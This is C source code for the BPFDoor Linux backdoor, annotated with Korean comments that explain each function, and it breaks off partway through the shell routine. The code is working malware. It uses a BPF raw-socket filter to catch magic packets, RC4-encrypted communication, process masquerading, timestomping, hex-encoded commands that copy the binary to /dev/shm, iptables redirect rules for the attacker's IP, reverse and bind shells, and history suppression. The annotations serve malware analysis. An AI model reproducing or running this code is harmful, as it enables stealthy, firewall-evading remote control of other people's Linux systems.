/*
 * BPF(Berkeley Packet Filter) Door - 리눅스 백도어 멀웨어
 *
 * 백도어(뒷문이 열림), 도둑이 바로 눈 앞에 보이는 것 훔치고 달아나는게 아님
 * 최대한 오랫동안 이걸 이용해서 구조를 파악하는데 시간을 사용함
 * 수익성 있는 정보를 찾아다님 > 찾게되면 해당 정보를
 *
 * 이 멀웨어는 Red Menshen(중국 해커 그룹)과 연관이 있으며 원격 액세스를 위해 설계되었습니다.
 * 주요 기능:
 * 1. Berkeley Packet Filter(BPF)를 사용하여 패킷 스니핑 - 방화벽 우회 가능
 * 2. "매직 패킷"을 사용한 은밀한 통신 방식
 * 3. 다양한 프로세스 위장 기법(process masquerading)
 * 4. RC4 암호화를 사용한 통신
 * 5. 메모리 상주 기능(memory-resident)
 * 6. 안티-포렌식 기능
 *
 * 멀웨어 동작 방식:
 * - 실행 시 자신을 /dev/shm에 복사하고 이름을 변경(kdmtmpflush)
 * - 시스템 프로세스로 위장(dbus-daemon, systemd-journald 등)
 * - 네트워크 패킷을 모니터링하고 특정 "매직 패킷"을 감지하면 활성화
 * - 활성화 시 공격자에게 역방향 쉘(reverse shell)이나 바인드 쉘(bind shell) 제공
 * - 공격자 IP로부터 오는 트래픽을 특정 포트로 리다이렉트하는 방화벽 규칙 수정
 *
 * 주의: 이 코드는 교육 및 연구 목적으로만 사용하십시오.
 */

#include <arpa/inet.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/termios.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>
#include <ctype.h>
#include <netdb.h>
#include <sys/prctl.h>
#include <libgen.h>
#include <sys/time.h>
#include <time.h>
#include <linux/types.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <errno.h>
#include <strings.h>

#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif

extern char **environ;

#define __SID ('S' << 8)
#define I_PUSH (__SID | 2)

struct sniff_ip
{
        unsigned char ip_vhl;
        unsigned char ip_tos;
        unsigned short int ip_len;
        unsigned short int ip_id;
        unsigned short int ip_off;
#define IP_RF 0x8000
#define IP_DF 0x4000
#define IP_MF 0x2000
#define IP_OFFMASK 0x1fff
        unsigned char ip_ttl;
        unsigned char ip_p;
        unsigned short int ip_sum;
        struct in_addr ip_src, ip_dst;
};
#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)
#define IP_V(ip) (((ip)->ip_vhl) >> 4)

typedef unsigned int tcp_seq;
struct sniff_tcp
{
        unsigned short int th_sport;
        unsigned short int th_dport;
        tcp_seq th_seq;
        tcp_seq th_ack;
        unsigned char th_offx2;
#define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
        unsigned char th_flags;
#define TH_FIN 0x01
#define TH_SYN 0x02
#define TH_RST 0x04
#define TH_PUSH 0x08
#define TH_ACK 0x10
#define TH_URG 0x20
#define TH_ECE 0x40
#define TH_CWR 0x80
#define TH_FLAGS (TH_FIN | TH_SYN | TH_RST | TH_ACK | TH_URG | TH_ECE | TH_CWR)
        unsigned short int th_win;
        unsigned short int th_sum;
        unsigned short int th_urp;
} __attribute__((packed));

struct sniff_udp
{
        uint16_t uh_sport;
        uint16_t uh_dport;
        uint16_t uh_ulen;
        uint16_t uh_sum;
} __attribute__((packed));

struct magic_packet
{
        unsigned int flag;
        in_addr_t ip;
        unsigned short port;
        char pass[14];
} __attribute__((packed));

#ifndef uchar
#define uchar unsigned char
#endif

typedef struct
{
        uchar state[256];
        uchar x, y;
} rc4_ctx;

extern char *ptsname(int);
extern int grantpt(int fd);
extern int unlockpt(int fd);
extern int ioctl(int __fd, unsigned long int __request, ...) __THROW;

#define TIOCSCTTY 0x540E
#define TIOCGWINSZ 0x5413
#define TIOCSWINSZ 0x5414
#define ECHAR 0x0b

#define BUF 32768

struct config
{
        char stime[4];
        char etime[4];
        char mask[512];
        char pass[14];
        char pass2[14];
} __attribute__((packed));

struct config cfg;
int pty, tty;
int godpid;
char pid_path[50];

int shell(int, char *, char *);
void getshell(char *ip, int fromport);

char *argv0 = NULL;

rc4_ctx crypt_ctx, decrypt_ctx;

/*
 * RC4 암호화 구현
 * RC4는 스트림 암호로, 통신을 암호화하기 위해 사용됩니다.
 * 이 함수는 두 값을 교환하는 헬퍼 함수입니다.
 */
void xchg(uchar *a, uchar *b)
{
        uchar c = *a;
        *a = *b;
        *b = c;
}

/*
 * RC4 초기화 함수
 * 키를 사용하여 RC4 암호화 컨텍스트를 초기화합니다.
 * 이 초기화는 KSA(Key Scheduling Algorithm)로 불리는 RC4의 첫 단계입니다.
 */
void rc4_init(uchar *key, int len, rc4_ctx *ctx)
{
        uchar index1, index2;
        uchar *state = ctx->state;
        uchar i;

        i = 0;
        do
        {
                state[i] = i;
                i++;
        } while (i);

        ctx->x = ctx->y = 0;
        index1 = index2 = 0;
        do
        {
                index2 = key[index1] + state[i] + index2;
                xchg(&state[i], &state[index2]);
                index1++;
                if (index1 >= len)
                        index1 = 0;
                i++;
        } while (i);
}

/*
 * RC4 암호화/복호화 함수
 * 데이터를 암호화하거나 복호화합니다(RC4는 대칭 암호이므로 동일한 연산이 두 방향 모두에 사용됨).
 * PRGA(Pseudo-Random Generation Algorithm)로 불리는 RC4의 두 번째 단계입니다.
 */
void rc4(uchar *data, int len, rc4_ctx *ctx)
{
        uchar *state = ctx->state;
        uchar x = ctx->x;
        uchar y = ctx->y;
        int i;

        for (i = 0; i < len; i++)
        {
                uchar xor ;

                x++;
                y = state[x] + y;
                xchg(&state[x], &state[y]);

                xor = state[x] + state[y];
                data[i] ^= state[xor];
        }

        ctx->x = x;
        ctx->y = y;
}

/*
 * 암호화된 쓰기 함수
 * 데이터를 암호화한 후 소켓에 씁니다.
 * 공격자와의 통신 시 데이터가 암호화되도록 합니다.
 */
int cwrite(int fd, void *buf, int count)
{
        uchar *tmp;
        int ret;

        if (!count)
                return 0;
        tmp = malloc(count);
        if (!tmp)
                return 0;
        memcpy(tmp, buf, count);
        rc4(tmp, count, &crypt_ctx);
        ret = write(fd, tmp, count);
        free(tmp);
        return ret;
}

/*
 * 암호화된 읽기 함수
 * 소켓에서 데이터를 읽은 후 복호화합니다.
 * 공격자로부터 받은 암호화된 명령을 처리하기 위해 사용됩니다.
 */
int cread(int fd, void *buf, int count)
{
        int i;

        if (!count)
                return 0;
        i = read(fd, buf, count);

        if (i > 0)
                rc4(buf, i, &decrypt_ctx);
        return i;
}

/*
 * PID 파일을 제거하는 함수
 * 멀웨어가 정상적으로 종료될 때 PID 파일을 제거하여 흔적을 지웁니다.
 */
static void remove_pid(char *pp)
{
        unlink(pp);
}

/*
 * 타임스탬프 조작(timestomping) 함수
 * 파일의 생성/수정 시간을 변경하여 포렌식 분석을 방해합니다.
 * 2008년 10월 30일 시간으로 설정하여 오래된 파일처럼 보이게 합니다.
 */
static void setup_time(char *file)
{
        struct timeval tv[2];

        tv[0].tv_sec = 1225394236; // 2008년 10월 30일
        tv[0].tv_usec = 0;

        tv[1].tv_sec = 1225394236; // 공격자가 변조해서 사용했을 가능성이 높음
        tv[1].tv_usec = 0;

        utimes(file, tv);
}

/*
 * 종료 처리 함수
 * 프로세스가 종료될 때 PID 파일을 제거하여 흔적을 지웁니다.
 */
static void terminate(void)
{
        if (getpid() == godpid)
                remove_pid(pid_path);

        _exit(EXIT_SUCCESS);
}

/*
 * 시그널 핸들러
 * SIGTERM 시그널이 발생했을 때 안전하게 종료하도록 합니다.
 */
static void on_terminate(int signo)
{
        terminate();
}

/*
 * 시그널 초기화 함수
 * 프로세스 종료 시 필요한 정리 작업을 등록합니다.
 */
static void init_signal(void)
{
        atexit(terminate);
        signal(SIGTERM, on_terminate);
        return;
}

/*
 * 자식 프로세스 종료 처리 함수
 * 좀비 프로세스를 방지하기 위해 자식 프로세스 종료를 처리합니다.
 */
void sig_child(int i)
{
        signal(SIGCHLD, sig_child);
        waitpid(-1, NULL, WNOHANG);
}

/*
 * 마스터 PTY 열기 함수
 * 터미널 인터페이스를 위한 가상 터미널(PTY)의 마스터 측을 생성합니다.
 * 이는 원격 쉘 연결을 제공하기 위해 사용됩니다.
 */
int ptym_open(char *pts_name)
{
        char *ptr;
        int fd;

        strcpy(pts_name, "/dev/ptmx");
        if ((fd = open(pts_name, O_RDWR)) < 0)
        {
                return -1;
        }

        if (grantpt(fd) < 0)
        {
                close(fd);
                return -2;
        }

        if (unlockpt(fd) < 0)
        {
                close(fd);
                return -3;
        }

        if ((ptr = ptsname(fd)) == NULL)
        {
                close(fd);
                return -4;
        }

        strcpy(pts_name, ptr);

        return fd;
}

/*
 * 슬레이브 PTY 열기 함수
 * 가상 터미널(PTY)의 슬레이브 측을 열고 필요한 터미널 설정을 합니다.
 */
int ptys_open(int fd, char *pts_name)
{
        int fds;

        if ((fds = open(pts_name, O_RDWR)) < 0)
        {
                close(fd);
                return -5;
        }

        if (ioctl(fds, I_PUSH, "ptem") < 0)
        {
                return fds;
        }

        if (ioctl(fds, I_PUSH, "ldterm") < 0)
        {
                return fds;
        }

        if (ioctl(fds, I_PUSH, "ttcompat") < 0)
        {
                return fds;
        }

        return fds;
}

/*
 * 가상 터미널(TTY) 열기 함수
 * 마스터와 슬레이브 PTY를 설정합니다.
 * 원격 쉘 세션을 제공하기 위한 양방향 통신 채널을 설정합니다.
 */
int open_tty()
{
        char pts_name[20];

        pty = ptym_open(pts_name);

        tty = ptys_open(pty, pts_name);

        if (pty >= 0 && tty >= 0)
                return 1;
        return 0;
}

/*
 * 연결 시도 함수
 * 지정된 IP 주소와 포트로 TCP 연결을 시도합니다.
 * 역방향 쉘(reverse shell)을 공격자에게 연결할 때 사용됩니다.
 */
int try_link(in_addr_t ip, unsigned short port)
{
        struct sockaddr_in serv_addr;
        int sock;

        bzero(&serv_addr, sizeof(serv_addr));

        serv_addr.sin_addr.s_addr = ip;

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
                return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = port;

        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr)) == -1)
        {
                close(sock);
                return -1;
        }
        return sock;
}

/*
 * 모니터링 함수
 * 대상 IP 주소와 포트로 UDP 패킷을 전송합니다.
 * 이 함수는 백도어가 아직 실행 중임을 확인하는 핑 메커니즘으로 사용됩니다.
 */
int mon(in_addr_t ip, unsigned short port)
{
        struct sockaddr_in remote;
        int sock;
        int s_len;

        bzero(&remote, sizeof(remote));
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < -1)
        {
                return -1;
        }
        remote.sin_family = AF_INET;
        remote.sin_port = port;
        remote.sin_addr.s_addr = ip;

        if ((s_len = sendto(sock, "1", 1, 0, (struct sockaddr *)&remote, sizeof(struct sockaddr))) < 0)
        {
                close(sock);
                return -1;
        }
        close(sock);
        return s_len;
}

/*
 * 프로세스 이름 설정 함수
 * 멀웨어 프로세스의 이름을 변경하여 시스템 프로세스인 것처럼 위장합니다.
 * 이는 ps 명령 등에서 정상 서비스처럼 보이도록 합니다.
 */
int set_proc_name(int argc, char **argv, char *new)
{
        size_t size = 0;
        int i;
        char *raw = NULL;
        char *last = NULL;

        argv0 = argv[0];

        for (i = 0; environ[i]; i++)
                size += strlen(environ[i]) + 1;

        raw = (char *)malloc(size);
        if (NULL == raw)
                return -1;

        for (i = 0; environ[i]; i++)
        {
                memcpy(raw, environ[i], strlen(environ[i]) + 1);
                environ[i] = raw;
                raw += strlen(environ[i]) + 1;
        }

        last = argv[0];

        for (i = 0; i < argc; i++)
                last += strlen(argv[i]) + 1;
        for (i = 0; environ[i]; i++)
                last += strlen(environ[i]) + 1;

        memset(argv0, 0x00, last - argv0);
        strncpy(argv0, new, last - argv0);

        prctl(PR_SET_NAME, (unsigned long)new); // 프로세스 이름 위장
        return 0;
}

/*
 * 초기화 및 실행 함수
 * 멀웨어 바이너리를 공유 메모리(/dev/shm/)로 복사하고 실행 권한을 설정합니다.
 * 그리고 복사된 바이너리에 --init 플래그를 전달하여 초기화를 수행합니다.
 * 이후 원본 파일을 삭제하여 흔적을 제거합니다.
 */
int to_open(char *name, char *tmp)
{
        char cmd[256] = {0};
        char fmt[] = {
            0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72, 0x6d, 0x20, 0x2d, 0x66,
            0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d, 0x2f,
            0x25, 0x73, 0x3b, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x70,
            0x20, 0x25, 0x73, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73,
            0x68, 0x6d, 0x2f, 0x25, 0x73, 0x20, 0x26, 0x26, 0x20, 0x2f,
            0x62, 0x69, 0x6e, 0x2f, 0x63, 0x68, 0x6d, 0x6f, 0x64, 0x20,
            0x37, 0x35, 0x35, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73,
            0x68, 0x6d, 0x2f, 0x25, 0x73, 0x20, 0x26, 0x26, 0x20, 0x2f,
            0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d, 0x2f, 0x25, 0x73,
            0x20, 0x2d, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x20, 0x26, 0x26,
            0x20, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x72, 0x6d, 0x20, 0x2d,
            0x66, 0x20, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x73, 0x68, 0x6d,
            0x2f, 0x25, 0x73, 0x00}; // /bin/rm -f /dev/shm/%s;/bin/cp %s /dev/shm/%s && /bin/chmod 755 /dev/shm/%s

        snprintf(cmd, sizeof(cmd), fmt, tmp, name, tmp, tmp, tmp, tmp);
        system(cmd);
        sleep(2);
        if (access(pid_path, R_OK) == 0)
                return 0;
        return 1;
}

/*
 * 암호 확인 함수
 * 매직 패킷에서 전달된 암호가 유효한지 확인합니다.
 * 첫 번째 암호(cfg.pass)를 확인하여 0을 반환하거나
 * 두 번째 암호(cfg.pass2)를 확인하여 1을 반환합니다.
 * 두 암호 모두 일치하지 않으면 2를 반환합니다.
 * 반환 값에 따라 백도어가 다르게 동작합니다:
 * - 0: 바인드 쉘 제공 (공격자가 연결할 포트 개방)
 * - 1: 역방향 쉘 제공 (공격자에게 연결)
 * - 2: 핑백 메시지만 전송 (상태 확인)
 */
int logon(const char *hash)
{
        int x = 0;
        x = memcmp(cfg.pass, hash, strlen(cfg.pass));
        if (x == 0)
                return 0;
        x = memcmp(cfg.pass2, hash, strlen(cfg.pass2));
        if (x == 0)
                return 1;

        return 2;
}

/*
 * 패킷 처리 루프 함수
 * 이 함수는 BPFDoor의 핵심 기능인 패킷 스니핑을 담당합니다.
 * 다음과 같은 작업을 수행합니다:
 * 1. 로우 소켓(raw socket)을 생성하여 모든 IP 패킷을 캡처
 * 2. BPF(Berkeley Packet Filter) 필터를 설정하여 원하는 패킷만 처리
 * 3. 패킷이 특정 "매직" 값을 포함하는지 확인
 * 4. 매직 패킷이 발견되면 프로세스를 포크하여 쉘을 제공
 *
 * BPF 필터는 TCP, UDP, ICMP 패킷 중 특정 값(0x5293, 0x7255)을 포함하는
 * 패킷만 통과시키도록 설정되어 있어, 로컬 방화벽 규칙을 우회할 수 있습니다.
 */
void packet_loop()
{
        int sock, r_len, pid, scli, size_ip, size_tcp;
        socklen_t psize;
        uchar buff[512];
        const struct sniff_ip *ip;
        const struct sniff_tcp *tcp;
        struct magic_packet *mp;
        const struct sniff_udp *udp;
        in_addr_t bip;
        char *pbuff = NULL;

        //
        // Filter Options Build Filter Struct
        //

        struct sock_fprog filter;
        struct sock_filter bpf_code[] = {
            {0x28, 0, 0, 0x0000000c},
            {0x15, 0, 27, 0x00000800},
            {0x30, 0, 0, 0x00000017},
            {0x15, 0, 5, 0x00000011},
            {0x28, 0, 0, 0x00000014},
            {0x45, 23, 0, 0x00001fff},
            {0xb1, 0, 0, 0x0000000e},
            {0x48, 0, 0, 0x00000016},
            {0x15, 19, 20, 0x00007255},
            {0x15, 0, 7, 0x00000001},
            {0x28, 0, 0, 0x00000014},
            {0x45, 17, 0, 0x00001fff},
            {0xb1, 0, 0, 0x0000000e},
            {0x48, 0, 0, 0x00000016},
            {0x15, 0, 14, 0x00007255},
            {0x50, 0, 0, 0x0000000e},
            {0x15, 11, 12, 0x00000008},
            {0x15, 0, 11, 0x00000006},
            {0x28, 0, 0, 0x00000014},
            {0x45, 9, 0, 0x00001fff},
            {0xb1, 0, 0, 0x0000000e},
            {0x50, 0, 0, 0x0000001a},
            {0x54, 0, 0, 0x000000f0},
            {0x74, 0, 0, 0x00000002},
            {0xc, 0, 0, 0x00000000},
            {0x7, 0, 0, 0x00000000},
            {0x48, 0, 0, 0x0000000e},
            {0x15, 0, 1, 0x00005293},
            {0x6, 0, 0, 0x0000ffff},
            {0x6, 0, 0, 0x00000000},
        };

        filter.len = sizeof(bpf_code) / sizeof(bpf_code[0]);
        filter.filter = bpf_code;

        //
        // Build a rawsocket that binds the NIC to receive Ethernet frames
        //

        if ((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP))) < 1)
                return;

        //
        // Set a packet filter
        //

        if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &filter, sizeof(filter)) == -1)
        {
                return;
        }

        //
        // Loop to Read Packets in 512 Chunks
        //

        while (1)
        {
                memset(buff, 0, 512);
                psize = 0;
                r_len = recvfrom(sock, buff, 512, 0x0, NULL, NULL);

                ip = (struct sniff_ip *)(buff + 14);
                size_ip = IP_HL(ip) * 4;
                if (size_ip < 20)
                        continue;

                // determine protocl from packet (offset 14)
                switch (ip->ip_p)
                {
                case IPPROTO_TCP:
                        tcp = (struct sniff_tcp *)(buff + 14 + size_ip);
                        size_tcp = TH_OFF(tcp) * 4;
                        mp = (struct magic_packet *)(buff + 14 + size_ip + size_tcp);
                        break;
                case IPPROTO_UDP:
                        udp = (struct sniff_udp *)(ip + 1);
                        mp = (struct magic_packet *)(udp + 1);
                        break;
                case IPPROTO_ICMP:
                        pbuff = (char *)(ip + 1);
                        mp = (struct magic_packet *)(pbuff + 8);
                        break;
                default:
                        break;
                }

                // if magic packet is set process

                if (mp)
                {
                        if (mp->ip == INADDR_NONE)
                                bip = ip->ip_src.s_addr;
                        else
                                bip = mp->ip;

                        pid = fork();
                        if (pid)
                        {
                                waitpid(pid, NULL, WNOHANG);
                        }
                        else
                        {
                                int cmp = 0;
                                char sip[20] = {0};
                                char pname[] = {0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x69, 0x62, 0x65, 0x78, 0x65, 0x63, 0x2f, 0x70, 0x6f, 0x73, 0x74, 0x66, 0x69, 0x78, 0x2f, 0x6d, 0x61, 0x73, 0x74, 0x65, 0x72, 0x00}; // /usr/libexec/postfix/master

                                if (fork())
                                        exit(0);
                                chdir("/");
                                setsid();
                                signal(SIGHUP, SIG_DFL);
                                memset(argv0, 0, strlen(argv0));
                                strcpy(argv0, pname); // sets process name (/usr/libexec/postfix/master)
                                prctl(PR_SET_NAME, (unsigned long)pname);

                                rc4_init(mp->pass, strlen(mp->pass), &crypt_ctx);
                                rc4_init(mp->pass, strlen(mp->pass), &decrypt_ctx);

                                cmp = logon(mp->pass);
                                switch (cmp)
                                {
                                case 1:
                                        strcpy(sip, inet_ntoa(ip->ip_src));
                                        getshell(sip, ntohs(tcp->th_dport));
                                        break;
                                case 0:
                                        scli = try_link(bip, mp->port);
                                        if (scli > 0)
                                                shell(scli, NULL, NULL);
                                        break;
                                case 2:
                                        mon(bip, mp->port);
                                        break;
                                }
                                exit(0);
                        }
                }
        }
        close(sock);
}

/*
 * 바인드 소켓 생성 함수
 * 42391-43391 범위 내의 첫 번째 사용 가능한 포트에 소켓을 바인딩합니다.
 * 바인드 쉘을 설정할 때 사용됩니다.
 * 포트 값은 p 포인터를 통해 반환됩니다.
 */
int b(int *p)
{
        int port;
        struct sockaddr_in my_addr;
        int sock_fd;
        int flag = 1;

        if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
                return -1;
        }

        setsockopt(sock_fd, SOL_SOCKET, SO_REUSEADDR, (char *)&flag, sizeof(flag));

        my_addr.sin_family = AF_INET;
        my_addr.sin_addr.s_addr = 0;

        for (port = 42391; port < 43391; port++)
        {
                my_addr.sin_port = htons(port);
                if (bind(sock_fd, (struct sockaddr *)&my_addr, sizeof(struct sockaddr)) == -1)
                {
                        continue;
                }
                if (listen(sock_fd, 1) == 0)
                {
                        *p = port;
                        return sock_fd;
                }
                close(sock_fd);
        }
        return -1;
}

/*
 * 소켓 연결 수락 함수
 * 바인드된 소켓에서 클라이언트 연결을 수락합니다.
 * 바인드 쉘을 설정할 때 사용됩니다.
 */
int w(int sock)
{
        socklen_t size;
        struct sockaddr_in remote_addr;
        int sock_id;

        size = sizeof(struct sockaddr_in);
        if ((sock_id = accept(sock, (struct sockaddr *)&remote_addr, &size)) == -1)
        {
                return -1;
        }

        close(sock);
        return sock_id;
}

/*
 * 쉘 접속 제공 함수 (iptables 리다이렉션 사용)
 * 이 함수는 다음과 같은 작업을 수행합니다:
 * 1. 랜덤 포트에 쉘 서비스를 바인딩
 * 2. iptables 방화벽 규칙을 추가하여 특정 IP의 트래픽을 쉘 포트로 리다이렉션
 * 3. 쉘 세션 설정
 *
 * 이 방식은 방화벽이 설정된 시스템에서도 공격자가 정상적인 서비스 포트(예: SSH 포트 22)로
 * 연결하는 것처럼 보이게 하면서 실제로는 백도어 쉘에 연결되도록 합니다.
 *
 */
void getshell(char *ip, int fromport)
{
        int sock, sockfd, toport;
        char cmd[512] = {0}, rcmd[512] = {0}, dcmd[512] = {0};
        char cmdfmt[] = {
            0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
            0x65, 0x73, 0x20, 0x2d, 0x74, 0x20, 0x6e, 0x61, 0x74, 0x20, 0x2d, 0x41,
            0x20, 0x50, 0x52, 0x45, 0x52, 0x4f, 0x55, 0x54, 0x49, 0x4e, 0x47, 0x20,
            0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
            0x20, 0x2d, 0x2d, 0x64, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x25, 0x64, 0x20,
            0x2d, 0x6a, 0x20, 0x52, 0x45, 0x44, 0x49, 0x52, 0x45, 0x43, 0x54, 0x20,
            0x2d, 0x2d, 0x74, 0x6f, 0x2d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x20, 0x25,
            0x64, 0x00}; // /sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        char rcmdfmt[] = {
            0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
            0x65, 0x73, 0x20, 0x2d, 0x74, 0x20, 0x6e, 0x61, 0x74, 0x20, 0x2d, 0x44,
            0x20, 0x50, 0x52, 0x45, 0x52, 0x4f, 0x55, 0x54, 0x49, 0x4e, 0x47, 0x20,
            0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
            0x20, 0x2d, 0x2d, 0x64, 0x70, 0x6f, 0x72, 0x74, 0x20, 0x25, 0x64, 0x20,
            0x2d, 0x6a, 0x20, 0x52, 0x45, 0x44, 0x49, 0x52, 0x45, 0x43, 0x54, 0x20,
            0x2d, 0x2d, 0x74, 0x6f, 0x2d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x20, 0x25,
            0x64, 0x00}; // /sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        char inputfmt[] = {
            0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
            0x65, 0x73, 0x20, 0x2d, 0x49, 0x20, 0x49, 0x4e, 0x50, 0x55, 0x54, 0x20,
            0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
            0x20, 0x2d, 0x6a, 0x20, 0x41, 0x43, 0x43, 0x45, 0x50, 0x54, 0x00}; // /sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT
        char dinputfmt[] = {
            0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x69, 0x70, 0x74, 0x61, 0x62, 0x6c,
            0x65, 0x73, 0x20, 0x2d, 0x44, 0x20, 0x49, 0x4e, 0x50, 0x55, 0x54, 0x20,
            0x2d, 0x70, 0x20, 0x74, 0x63, 0x70, 0x20, 0x2d, 0x73, 0x20, 0x25, 0x73,
            0x20, 0x2d, 0x6a, 0x20, 0x41, 0x43, 0x43, 0x45, 0x50, 0x54, 0x00}; // /sbin/iptables -D INPUT -p tcp -s %s -j ACCEPT

        sockfd = b(&toport); // looks like it selects random ephemral port here
        if (sockfd == -1)
                return;

        snprintf(cmd, sizeof(cmd), inputfmt, ip);
        snprintf(dcmd, sizeof(dcmd), dinputfmt, ip);
        system(cmd); // executes /sbin/iptables -I INPUT -p tcp -s %s -j ACCEPT
        sleep(1);
        memset(cmd, 0, sizeof(cmd));
        snprintf(cmd, sizeof(cmd), cmdfmt, ip, fromport, toport);
        snprintf(rcmd, sizeof(rcmd), rcmdfmt, ip, fromport, toport);
        system(cmd); // executes /sbin/iptables -t nat -A PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        sleep(1);
        sock = w(sockfd); // creates a sock that listens on port specified earlier
        if (sock < 0)
        {
                close(sock);
                return;
        }

        //
        // passes sock and
        // rcmd = /sbin/iptables -t nat -D PREROUTING -p tcp -s %s --dport %d -j REDIRECT --to-ports %d
        // dcmd =  /sbin/iptables -D INPUT -p tcp -s %s -j ACCEPT
        //
        //

        shell(sock, rcmd, dcmd);
        close(sock);
}

/*
 * 쉘 세션 관리 함수
 * 원격 접속을 위한 쉘 세션을 설정하고 관리합니다.
 * 가상 터미널(PTY)을 설정하고 I/O를 리다이렉션하여 원격 쉘 접근을 제공합니다.
 * 쉘은 "qmgr -l -t fifo -u" 명령으로 위장하여 ps 출력에서 정상적인 프로세스처럼 보이게 합니다.
 *
 * 주요 기능:
 * 1. 가상 터미널 설정
 * 2. 쉘 환경 변수 설정 (시스템 로그를 남기지 않도록 HISTFILE 등 설정)
 * 3. 쉘 프로세스 포크 및 실행
 * 4. 암호화된 통신으로 데이터 송수신
 */
int shell(int sock, char *rcmd, char *dcmd)
{
        int subshell;
        fd_set fds;
        char buf[BUF];
        char argx[] = {
            0x71, 0x6d, 0x67, 0x72, 0x20, 0x2d, 0x6c, 0x20, 0x2d, 0x74,
            0x20, 0x66, 0x69, 0x66, 0x6f, 0x20, 0x2d, 0x75, 0x00}; // qmgr -l -t fifo -u
        char *argvv[] = {argx, NULL, NULL};
#define MAXENV 256
#define ENVLEN 256
        char *envp[MAXENV];
        char sh[] = {0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00}; // /bin/sh
        int ret;
        char home[] = {0x48, 0x4f, 0x4d, 0x45, 0x3d, 0x2f, 0x74, 0x6d, 0x70, 0x00}; // HOME=/tmp
        char ps[] = {
            0x50, 0x53, 0x31, 0x3d, 0x5b, 0x5c, 0x75, 0x40, 0x5c, 0x68, 0x20,
            0x5c, 0x57, 0x5d, 0x5c, 0x5c, 0x24, 0x20, 0x00}; // PS1=[\u@\h \W]\\$
        char histfile[] = {
            0x48, 0x49, 0x53, 0x54, 0x46, 0x49, 0x4c, 0x45, 0x3d, 0x2f, 0x64,
            0x65, 0x76, 0x2f, 0x6e, 0x75, 0x6c, 0x6c, 0x00}; // HISTFILE=/dev/null
        char mshist[] = {
            0x4d, 0x59, 0x53, 0x51, 0x4c, 0x5f, 0x48, 0x49, 0x53, 0x54, 0x46,
            0x49, 0x4c, 0x45, 0x3d, 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x6e, 0x75,
            0x6c, 0x6c, 0x00}; // MYSQL_HISTFILE=/dev/null
        char ipath[] = {
            0x50, 0x41, 0x54, 0x48, 0x3d, 0x2f, 0x62, 0x69, 0x6e,
            0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6b, 0x65, 0x72, 0x62, 0x65,
            0x72, 0x6f, 0x73, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75,
            0x73, 0x72, 0x2f, 0x6b, 0x65, 0x72, 0x62, 0x65, 0x72, 0x6f, 0x73,
            0x2f, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a,
            0x2f, 0x75, 0x73, 0x72, 0x2f, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75,
            0x73, 0x72, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75, 0x73,
            0x72, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x2f, 0x62, 0x69, 0x6e,
            0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f, 0x6c, 0x6f, 0x63, 0x61, 0x6c,
            0x2f, 0x73, 0x62, 0x69, 0x6e, 0x3a, 0x2f, 0x75, 0x73, 0x72, 0x2f,
            0x58, 0x31, 0x31, 0x52, 0x36, 0x2f, 0x62, 0x69, 0x6e, 0x3a, 0x2e,
